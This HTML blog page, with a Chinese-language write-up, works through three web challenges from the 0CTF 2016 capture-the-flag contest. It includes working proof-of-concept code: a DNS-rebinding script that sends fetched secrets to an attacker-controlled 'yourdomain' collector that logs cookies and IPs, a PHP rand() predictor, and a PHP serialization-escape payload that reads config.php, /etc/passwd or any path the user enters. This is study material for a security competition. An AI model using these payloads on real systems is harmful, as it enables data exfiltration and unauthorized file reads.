@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title> 0ctf 2016 部分 web writeup - Virink's Blog </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="author" content="Virink">
+    <meta name="keyword" content="virink audit php python docker hacker bug exp vuls">
+    <meta name="description" content="This is a blog that I was recorded some personal journals and some articles, it maybe can help you in some way.">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="0ctf 2016 部分 web writeup - Virink's Blog">
+    <meta property="og:url" content="http://www.virzz.com/2016/03/14/0ctf_2016_bufen_web_writeup/index.html">
+    <meta property="og:site_name" content="Virink's Blog">
+    <meta property="og:description" content="This is a blog that I was recorded some personal journals and some articles, it maybe can help you in some way.">
+    <meta property="og:updated_time" content="2016-10+29T16:19:22+08:00">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="0ctf 2016 部分 web writeup - Virink's Blog">
+    <meta name="twitter:description" content="This is a blog that I was recorded some personal journals and some articles, it maybe can help you in some way.">
+    <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+    <link rel="icon" href="/static/img/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="/static/css/uno.css">
+    <script type="text/javascript" src="/static/js/jquery.min.js"></script>
+</head>
+
+<body>
+    <span class="mobile btn-mobile-menu">
+        <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+    </span>
+    <header class="panel-cover">
+        <div class="panel-main">
+            <div class="panel-main__inner panel-inverted">
+                <div class="panel-main__content">
+                    <a href="/" title="link to homepage for Virink's Blog">
+                        <img src="/static/img/avatar.png" width="80" alt="Virink's Blog logo" class="panel-cover__logo logo" />
+                    </a>
+                    <h1 class="panel-cover__title panel-title">
+                        <a href="/" title="link to homepage"> Virink </a>
+                    </h1>
+                    <hr class="panel-cover__divider" />
+                    <p class="panel-cover__description">A boring and silly single dog, who can't do anything except zhuangbi.</p>
+                    <div id="tagscloud" class="panel-cover__divider">
+                        <a href="/tags/audit" class="tagc1">Audit</a><a href="/tags/web" class="tagc2">Web</a><a href="/tags/writeups" class="tagc3">Writeups</a><a href="/tags/python" class="tagc4">Python</a><a href="/tags/vuls" class="tagc5">Vuls</a><a href="/tags/thinking" class="tagc1">Thinking</a><a href="/tags/ctf" class="tagc2">CTF</a><a href="/tags/other" class="tagc3">Other</a><a href="/tags/flask" class="tagc4">Flask</a><a href="/tags/go" class="tagc5">Golang</a><a href="/tags/docker" class="tagc1">Docker</a><a href="/tags/php" class="tagc2">PHP</a><a href="/tags/tools" class="tagc3">Tools</a>
+                    </div>
+                    <div class="navigation-wrapper">
+                        <nav class="cover-navigation cover-navigation--primary">
+                            <ul class="navigation">
+                                <li class="navigation__item"> <a href="/#blog" title="" class="blog-button"> Blog </a></li>
+                                <li class="navigation__item"> <a href="/about" title="" class=""> About</a></li>
+                                <li class="navigation__item"> <a href="/links" title="" class=""> Links </a></li>
+                            </ul>
+                        </nav>
+                        <hr class="panel-cover__divider" />
+                        <nav class="cover-navigation navigation--social">
+                            <ul class="navigation">
+                                <!-- Github -->
+                                <li class="navigation__item">
+                                    <a href="https://github.com/virink" target="_blank">
+                                        <i class='fa fa-github' aria-hidden="true"></i>
+                                        <span class="label"> GitHub </span>
+                                    </a>
+                                </li>
+                                <!-- Twitter -->
+                                <li class="navigation__item">
+                                    <a href="https://twitter.com/virinkz" target="_blank">
+                                        <i class='fa fa-twitter' aria-hidden="true"></i>
+                                        <span class="label"> Twitter </span>
+                                    </a>
+                                </li>
+                                <!-- Twitter -->
+                                <li class="navigation__item">
+                                    <a href="https://telegram.me/virink" target="_blank">
+                                        <i class='fa fa-paper-plane' aria-hidden="true"></i>
+                                        <span class="label"> Telegram </span>
+                                    </a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            <div class="panel-cover--overlay"> </div>
+        </div>
+    </header>
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            <article class="post-container post-container--single">
+                <header class="post-header">
+                    <div class="post-meta">
+                        <time datetime="2016-03-14 10:49:06" class="post-meta__date date">2016-03-14 10:49:06</time> &#8226;
+                        <span class="post-meta__tags tags">
+                    <font class="categories"></font>
+                    <font class="tags">
+                      <a class="tags-link" href="/tags/web/">Web</a> , <a class="tags-link" href="/tags/writeups/">Writeups</a> , <a class="tags-link" href="/tags/ctf/">CTF</a>
+                    </font>
+                  </span>
+                    </div>
+                    <h1 class="post-title">  </h1>
+                </header>
+                <section class="post">
+                    <h1>0ctf 2016 部分 web writeup</h1>
+<h2>monkey</h2>
+<p>折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊</p>
+<p><a href="http://www.cloudxns.net/" title="http://www.cloudxns.net/">域名解析商</a></p>
+<p>根据页面提示 <strong>$str so that (substr(md5($str), 0, 6) === 'c1da58')</strong>，果断跑数字，成功爆破，最后确定为7-9位左右</p>
+<p>再根据提示<strong>What is Same Origin Policy?</strong>，明显的同源策略</p>
+<p>先来一发ajax获取数据：</p>
+<h3>js.php or js.html</h3>
+<pre><code>&lt;script src="jquery.min.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+function getdata(){
+    $.ajax({
+        type: "GET",
+        url:'http://xxx.com:8080/secret',
+        async: true,
+        error: function(request) {
+            getdata();
+        },
+        success: function(data) {
+            $.get('http://yourdomain/get.php?data='+data);
+        }
+    });
+}
+getdata();
+&lt;/script&gt;
+</code></pre>
+<p>再来一发get.php:</p>
+<pre><code>&lt;?php
+    $data = "get : ".urldecode(urldecode($_SERVER['QUERY_STRING']));
+    $data .= "\r\npost : ".urldecode(urldecode(file_get_contents("php://input")));
+    $data .= "\r\nip : ".$_SERVER["REMOTE_ADDR"];
+    $data .= "\r\nREFERER : ".$_SERVER['HTTP_REFERER'];
+    $data .= "\r\nHTTP_USER_AGENT : ".$_SERVER['HTTP_USER_AGENT'];
+    $data .= "\r\nREQUEST_METHOD : ".$_SERVER['REQUEST_METHOD'];
+    $data .= "\r\nCookies : ".implode(' ',$_COOKIES);
+    if(strlen($data)&gt;10){
+        file_put_contents("get.txt","### ".date("Y-m-d H:m:s")." ###\r\n".$data."\r\n", FILE_APPEND);
+    }
+?&gt;
+</code></pre>
+<p>最后来一发自动爆破并提交的py：</p>
+<h3>monkey_poc.py</h3>
+<pre><code>#!/bin/env python
+#-*- encoding: utf-8 -*-
+
+import md5
+import os
+import re
+import time
+import requests
+
+def mx(str):
+    m1 = md5.new()   
+    m1.update(str)   
+    return m1.hexdigest()
+
+if __name__ == '__main__':
+    r = requests.session()
+    print 'start'
+    g = r.get("http://202.120.7.200/index.php")
+    m = re.search(r'\(substr\(md5\(\$str\), 0, 6\) === \'([1|2|3|4|5|6|7|8|9|0|a|b|c|d|e|f]{6})\'\)', g.content).group(1)
+    print 'fucking ' + m
+    for x in range(10000000,100000000):
+        a = mx(str(x))[0:6]
+        if a == m:
+            print 'get string: ' + str(x)
+            _data = {"task":str(x), "url":"http://xxx.com:8080/fuck.php?a="+str(x)}
+            b = r.post("http://202.120.7.200/run.php",data=_data)
+            print b.content
+            break
+    time.sleep(3)
+    i = 120  
+    while i:
+        if i == 110:
+            print ' Please change you dns'
+        else:
+            print i
+        i = i-1
+        time.sleep(1)
+    print 'end'
+</code></pre>
+<p>拿起你的域名、、、找一个牛X的dns解析提供商</p>
+<p>运行poc后，根据提示把域名A记录改为127.0.0.1</p>
+<p>你的js.php或者js.html需要放在8080端口哦、、、Orz</p>
+<p>拼手速+网速的时候到了</p>
+<h2>rand_2</h2>
+<p>题目源码</p>
+<pre><code>&lt;?php
+include('config.php');
+session_start();
+
+if($_SESSION['time'] &amp;&amp; time() - $_SESSION['time'] &gt; 60) {
+    session_destroy();
+    die('timeout');
+} else {
+    $_SESSION['time'] = time();
+}
+
+echo rand();
+if (isset($_GET['go'])) {
+    $_SESSION['rand'] = array();
+    $i = 5;
+    $d = '';
+    while($i--){
+        $r = (string)rand();
+        $_SESSION['rand'][] = $r;
+        $d .= $r;
+    }
+    echo md5($d);
+} else if (isset($_GET['check'])) {
+    if ($_GET['check'] === $_SESSION['rand']) {
+        echo $flag;
+    } else {
+        echo 'die';
+        session_destroy();
+    }
+} else {
+    show_source(__FILE__);
+}
+</code></pre>
+<p>由于<strong>$_GET['check'] === $_SESSION['rand']</strong>是<strong>===全等类型</strong>判断，目测无法绕过、脑洞必然在rand()</p>
+<p>这方面没怎么研究、完全现学现卖、、疯狂地百度</p>
+<p>参考文章 ： <a href="http://www.cnblogs.com/wgbs25673578/p/4873269.html" title="随机数产生原理">随机数产生原理</a></p>
+<p>队友写的POC</p>
+<h3>rand_2_poc.py</h3>
+<pre><code>#!/bin/env python
+#-*- encoding: utf-8 -*-
+
+import requests
+
+while True:
+    r = requests.session()
+    l = []
+    # 获取50个随机rand值并存入list
+    for i in range(50):
+        response = r.get('http://202.120.7.202:8888/')
+        l.append(int(response.content[:response.content.find('&lt;')]))
+    #将$_SESSION['rand']这个数组写满5个随机数
+    response = r.get('http://202.120.7.202:8888/?go')
+    #获取将MD5之前的rand随机数存到list
+    l.append(int(response.content[:-32]))
+    url = 'http://202.120.7.202:8888/?'
+    for i in range(5):
+        end = len(l)
+        #由随机数生成算法预测下一个随机数
+        randNUM = (l[end-3]+l[end-31]) % 2147483648 
+        l.append(randNUM)#将新生成的也加入到列表里
+        #构造url 传入数组5个预测rand随机数
+        url += 'check[]={}&amp;'.format(randNUM)
+    response = r.get(url)#GET请求url 同时传入参数
+    #如果输出不是 die 大功告成
+    if 'die' not in response.content:
+        print response.content
+        break
+</code></pre>
+<h2>piapiapia</h2>
+<p>下载源码、通读一遍。</p>
+<p>大概可以知道这题的脑洞在于是更新个人资料。</p>
+<p>并且，<strong>flag是在config.php中！</strong></p>
+<p>在class.php中可以看到filter()过滤函数，update_profile()更新profile函数</p>
+<pre><code>public function filter($string) {
+    $escape = array('\'', '\\\\');
+    $escape = '/' . implode('|', $escape) . '/';
+    $string = preg_replace($escape, '_', $string);
+    $safe = array('select', 'insert', 'update', 'delete', 'where');
+    $safe = '/' . implode('|', $safe) . '/i';
+    return preg_replace($safe, 'hacker', $string);
+}
+</code></pre>
+<p><strong>可以知道'和\被替换成_，以及select、insert、update、delete和where被替换成hacker。</strong></p>
+<pre><code>public function update_profile($username, $new_profile) {
+    $username = parent::filter($username);
+    $new_profile = parent::filter($new_profile);
+    $where = "username = '$username'";
+    return parent::update($this-&gt;table, 'profile', $new_profile, $where);
+}
+</code></pre>
+<p><strong>所更新的资料都是被filter()过滤后的。</strong></p>
+<p>在update.php中</p>
+<pre><code>$user-&gt;update_profile($username, serialize($profile));
+</code></pre>
+<p><strong>更新的profile是警告序列化转换的。</strong></p>
+<p>再往上看，用户输入的数据都是经过正则验证的，然而其中有这样一段代码</p>
+<pre><code>if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10){
+    die('Invalid nickname');
+}
+</code></pre>
+<p>明显和另外两个变量，email和photo不同、此处必定是脑洞！！！</p>
+<pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
+返回值
+preg_match()返回 pattern 的匹配次数。   它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。
+如果发生错误preg_match()返回 FALSE。
+</code></pre>
+<p><strong>如果发生错误preg_match()返回 FALSE。</strong></p>
+<p>当我们输入数组的时候，必定会导致preg_match()返回FALSE，同时让数组长度&lt;10的很简单的，即可以提交<strong>nickname[]=playload</strong></p>
+<p>我们提交nickname[]=xxx可以得到序列化语句：</p>
+<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
+</code></pre>
+<p>根据PHP <strong>unserialize()</strong>的特性（<em>这个是测试出来的</em>），解序列化一个完整序列化语句之后的字符串是会被无视掉的。例如：</p>
+<pre><code>unserialize('a:1:{s:5:"phone";s:11:"12345678901";}')
+</code></pre>
+<p>等价于</p>
+<pre><code>unserialize('a:1:{s:5:"phone";s:11:"12345678901";}xxxxxxxxxxxxxxxx')
+</code></pre>
+<p>所以、我们可以构造一个特殊的序列化语句，伪造一个photo路径，就像这样：</p>
+<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
+</code></pre>
+<p>但是，我们提交的nickname[]=xxx";}s:5:"photo";s:10:"config.php的时候，却是会得到：</p>
+<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:34:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
+</code></pre>
+<p>即</p>
+<pre><code>a:1:{i:0;s:34:"xxx";}s:5:"photo";s:10:"config.php";}
+</code></pre>
+<p>我们需要逃逸<strong>";}s:5:"photo";s:10:"config.php</strong>这31个字符</p>
+<p>这时、猛然发现filter()中，把where替换成hacker明显逃逸了一个字符。。。。。脑洞完全暴露</p>
+<p>当 'where'<em>n+'";}s:5:"photo";s:10:"config.php' == 'hacker'</em>n 的时候，就可以成功逃逸</p>
+<p>得到playload：</p>
+<pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php
+</code></pre>
+<h3>piapiapia_poc.py</h3>
+<pre><code>#!/bin/env python
+#-*- encoding: utf-8 -*-
+
+def getflag():
+    playload = '";}s:5:"photo";s:10:"config.php'
+    w = 'where'
+    h = 'hacker'
+    for i in range(100):
+        if len(w*i +playload) == len(h*i):
+            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
+            break
+
+def getpasswd():
+    playload = '";}s:5:"photo";s:11:"/etc/passwd'
+    w = 'where'
+    h = 'hacker'
+    for i in range(100):
+        if len(w*i +playload) == len(h*i):
+            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
+            break
+
+def getany(f):
+    playload = '";}s:5:"photo";s:'+str(len(f))+':"'+f
+    w = 'where'
+    h = 'hacker'
+    for i in range(100):
+        if len(w*i +playload) == len(h*i):
+            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
+            break
+    update(w*i +playload)
+
+if __name__ == '__main__':
+    print 'get flag playload:\r\n'
+    getflag()
+    print 'get /ect/passwd playload:\r\n'
+    getpasswd()
+    f = raw_input("Input filepath what your want to read:")
+    getany(f)
+</code></pre>
+                </section>
+                <section class="post-comments">
+                    <div class="ds-thread" data-thread-key="2016/03/14/0ctf_2016_bufen_web_writeup/index.html" data-title="" data-url="http://www.virzz.com/2016/03/14/0ctf_2016_bufen_web_writeup/index.html"></div>
+                    <script type="text/javascript">
+                        var duoshuoQuery = {short_name:"virink"};
+                        (function() {
+                            var ds = document.createElement('script');
+                            ds.type = 'text/javascript';ds.async = true;
+                            ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+                            ds.charset = 'UTF-8';
+                            (document.getElementsByTagName('head')[0] 
+                             || document.getElementsByTagName('body')[0]).appendChild(ds);
+                        })();
+                    </script>
+                </section>
+            </article>
+            <footer class="footer">
+                <span class="footer__copyright">&copy; 2016-2017 | ❤ <a href="mailto:virink@outlook.com"> Virink </a></span>
+            </footer>
+        </div>
+    </div>
+    <!-- The main JavaScript file for Casper -->
+    <script type="text/javascript">
+    jQuery.browser = {};
+        (function () {
+            jQuery.browser.msie = false;
+            jQuery.browser.version = 0;
+            if (navigator.userAgent.match(/MSIE ([0-9]+)\./)) {
+                jQuery.browser.msie = true;
+                jQuery.browser.version = RegExp.$1;
+            }
+        })();
+    </script>
+    <script src="/static/js/main.js"></script>
+    <script src="/static/js/tagcloud.js"></script>
+    <script src="/static/js/scale.fix.js"></script>
+    <script src="/static/js/jquery.imagesloaded.min.js"></script>
+    <script src="/static/js/gallery.js"></script>
+    <script src="/static/js/jquery.githubRepoWidget.min.js"></script>
+    <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({ tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} });
+    </script>
+    <!--kill ie6 -->
+    <!--[if IE 6]>
+      <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+    <![endif]-->
+    <!-- analytics -->
+    <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?cc5bfd8791cd2c8a318145b9213ed80f";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+    <!-- totop -->
+    <div id="totop" style="position:fixed;bottom:50px;right:30px;cursor: pointer;">
+        <a title="back to top"><img style="width:30px;height:30px;" src="/static/img/totop.png" /></a>
+    </div>
+    <script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+    <!-- fancybox -->
+    <link rel="stylesheet" href="/static/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+    <script src="/static/fancybox/jquery.fancybox.pack.js"></script>
+    <script type="text/javascript">
+    (function($) {
+        $('.fancybox').fancybox();
+    })(jQuery);
+    </script>
+
+</html>
